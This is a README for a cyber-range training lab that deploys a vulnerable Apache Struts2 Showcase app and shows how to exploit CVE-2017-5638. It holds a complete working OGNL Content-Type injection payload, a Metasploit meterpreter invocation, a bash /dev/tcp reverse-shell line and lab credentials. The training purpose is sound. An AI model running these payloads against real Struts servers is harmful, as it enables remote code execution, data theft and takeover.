# Struts2 RCE (CVE-2017-5638) Lab

This lab deploys an Apache Struts2 Showcase application (Struts 2.3.12) on Tomcat. The Jakarta Multipart parser fails to validate the `Content-Type` header, allowing OGNL expression injection that leads to remote code execution.

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the "Model Editor" interface of the SPHERE platform, deploy the following model.
    ```python
    from mergexp import *

    net = Network('Single-Victim', addressing==ipv4, routing==static)

    attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
    victim = net.node('victim', image=='2404', proc.cores==2, memory.capacity==gb(2))

    link = net.connect([attacker, victim])

    link[attacker].socket.addrs = ip4('10.0.0.1/24')
    link[victim].socket.addrs   = ip4('10.0.0.2/24')

    experiment(net)
    ```

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. If the Ubuntu 24.04 root disk is not automatically expanded, run on the victim machine:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

### Deploy the Target Victim Machine

0. [Install Ansible](../setup_ansible/readme.md) on your XDC before proceeding.

1. The [`inventory.ini`](inventory.ini) is pre-configured to use SPHERE's DNS short name — no IP address lookup needed:
    ```ini
    [struts2_vm]
    struts2-target ansible_host=victim.infra ansible_user=lexuswang ansible_become_pass=lexuswang

    [struts2_vm:vars]
    ansible_python_interpreter=/usr/bin/python3
    ```
    `victim.infra` automatically resolves to the victim's infranet address via SPHERE DNS. Update `ansible_user` and `ansible_become_pass` if your SPHERE username differs from `lexuswang`.

2. Run the playbook:
    ```bash
    ansible-playbook -i inventory.ini struts2_target.yml --ask-become-pass
    ```

### Deploy the Attack Machine

Please refer to this [doc](../attacker_setup/readme.md) to set up the attack machine.

---

## Detailed Information about the Target System

**Service:** Apache Struts2 Showcase Application (Tomcat)

**Vulnerability:** CVE-2017-5638 (S2-045)

**Struts2 Version:** 2.3.12 (vulnerable)

**CVSS Score:** 10.0 Critical

**Port:** 8080

**Victim experiment network IP:** `10.0.0.2` (fixed in `merge_model.py`)

**URL:** `http://10.0.0.2:8080/struts2-showcase/`

**Service management:**
```bash
systemctl status tomcat
```

### How the vulnerability works

The Jakarta Multipart parser in Apache Struts 2.3.x (before 2.3.32) does not properly handle malformed `Content-Type` headers. When a request with a crafted Content-Type containing an OGNL expression is sent to any endpoint that accepts `multipart/form-data`, the parser evaluates the expression — allowing arbitrary command execution on the server.

---

## Testing (from attacker machine)

All commands run on the Kali attacker (`10.0.0.1`).

### Step 1: Confirm the application is running

```bash
curl http://10.0.0.2:8080/struts2-showcase/
```

### Step 2: Basic command execution via Content-Type injection

```bash
curl -i -X POST http://10.0.0.2:8080/struts2-showcase/integration/saveGangster.action \
-H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

Replace `'#cmd='id''` with other commands to test: `whoami`, `cat /etc/passwd`, `uname -a`, etc.

### Step 3: Metasploit

```bash
msfconsole -q -x "
use exploit/multi/http/struts2_content_type_ognl;
set RHOSTS 10.0.0.2;
set RPORT 8080;
set TARGETURI /struts2-showcase/integration/saveGangster.action;
set PAYLOAD linux/x64/meterpreter/reverse_tcp;
set LHOST 10.0.0.1;
set LPORT 4444;
exploit
"
```

### Step 4: Reverse shell (manual)

```bash
# Terminal 1: start listener on attacker
nc -lvnp 4444

# Terminal 2: trigger reverse shell via Content-Type injection
# Replace '#cmd='id'' in the Step 2 curl command with:
# '#cmd='bash -i >& /dev/tcp/10.0.0.1/4444 0>&1''
```

---

## Attack Chain

1. **Recon:** Port scan identifies Tomcat on 8080, Struts2 Showcase app
2. **Exploit:** Send crafted Content-Type header with OGNL expression
3. **RCE:** Command output returned in HTTP response body
4. **Shell:** Reverse shell or Meterpreter session established

---

## Credentials

| Account | Password |
|---------|----------|
| SSH `webuser` | `password123` |
